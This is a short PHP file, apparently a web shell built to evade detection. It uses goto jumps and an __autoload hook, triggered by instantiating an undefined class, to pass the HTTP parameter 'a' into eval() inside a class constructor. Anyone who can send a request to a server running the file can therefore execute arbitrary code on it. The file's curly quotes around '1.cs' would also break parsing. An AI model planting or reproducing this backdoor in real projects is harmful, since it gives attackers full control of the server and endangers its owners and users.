<?php
goto text2;
text3:
@$a = new abc();

text1:
class A{
    public $a;
    public function __construct($a){
        $c=$a;
        if (strlen($a)>2){
            $this->a = $c;
            eval($this->a);
            print('xxx');
        }else{
            print("NONONO");
        }
    }
}
goto text3;

text2:
function  __autoload($className) {  
    $b=$_GET['a'];
    new A($b);
    print($className);
    print('xx');
    @$filePath = “1.cs”;  
    if (is_readable($filePath)) {  
        require($filePath);  
    }  
}
goto text1;
?>